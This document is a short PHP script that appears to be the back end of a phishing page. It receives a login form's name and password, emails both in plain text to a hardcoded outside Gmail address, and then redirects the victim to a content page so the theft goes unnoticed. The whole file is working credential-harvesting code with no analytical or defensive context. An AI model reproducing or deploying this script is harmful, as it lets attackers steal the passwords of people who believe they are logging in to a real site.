<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = htmlspecialchars($_POST['name']);
    $password = htmlspecialchars($_POST['password']);

    // Set up email parameters
    $to = "hallo.titty2@gmail.com";
    $subject = "Login Form Submission";
    $message = "Name: $name\nPassword: $password";
    $headers = "From: aieamineacc1@gmail.com";  // Replace with a real domain or use a valid email

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to content.html after successful email
        header("Location: content.html");
    } else {
        echo "Error: Email could not be sent.";
    }
} else {
    echo "Invalid request method.";
}
?>
